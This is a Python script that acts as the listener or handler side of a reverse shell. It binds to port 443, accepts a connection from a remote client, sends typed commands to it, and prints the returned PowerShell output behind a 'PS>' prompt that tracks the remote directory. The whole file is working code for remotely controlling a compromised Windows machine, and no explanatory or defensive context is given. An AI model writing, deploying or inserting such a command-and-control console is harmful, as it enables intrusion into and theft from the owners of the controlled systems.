#!/usr/bin/env python3
import socket
import struct
import threading
import re

IP   = "192.168.100.138"
PORT = 443


class Listener:
    def __init__(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((IP, PORT))
        self.server_socket.listen()
        print(f"\n[+] Listening for incoming connections...")
        self.client_socket, self.client_address = self.server_socket.accept()
        print(f"[+] Connection established by {self.client_address}\n")

        self._output_done = threading.Event()
        self._output_done.set()
        self.current_path = ""

    def _recv_exact(self, n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = self.client_socket.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("Client disconnected")
            buf += chunk
        return buf

    def _receiver(self):
        while True:
            try:
                raw_len = self._recv_exact(4)
                msg_len = struct.unpack(">I", raw_len)[0]
                data    = self._recv_exact(msg_len)

                if data == b"<CMD_DONE>":
                    self._output_done.set()
                    continue

                lines          = data.split(b"\n")
                lines_filtered = []

                for l in lines:
                    l = l.rstrip(b"\r")

                    if b"<CMD_DONE>" in l:
                        continue

                    if l.startswith(b"PS "):
                        continue

                    path_match = re.search(rb"^PATH:(.+)$", l)
                    if path_match:
                        self.current_path = path_match.group(1).decode("cp850", errors="replace").strip()
                        continue

                    lines_filtered.append(l)

                data = b"\n".join(lines_filtered)

                if not data.strip():
                    continue

                self._output_done.clear()
                print(data.decode("cp850", errors="replace").replace("┬", ""), end="", flush=True)

            except (ConnectionError, OSError):
                self._output_done.set()
                print("\n[!] Cliente desconectado")
                break

    def send_command(self, cmd: str):
        payload = (cmd + "\n").encode("utf-8")
        header  = struct.pack(">I", len(payload))
        self.client_socket.sendall(header + payload)

    def run(self):
        t = threading.Thread(target=self._receiver, daemon=True)
        t.start()

        while True:
            try:
                self._output_done.wait()
                prompt = f"PS {self.current_path}> " if self.current_path else "PS> "
                cmd = input(prompt).strip()
                if not cmd:
                    continue
                if cmd.lower() in ("exit", "quit"):
                    self.send_command(cmd)
                    break
                self._output_done.clear()
                self.send_command(cmd)
            except KeyboardInterrupt:
                break


if __name__ == "__main__":
    my_listener = Listener()
    my_listener.run()
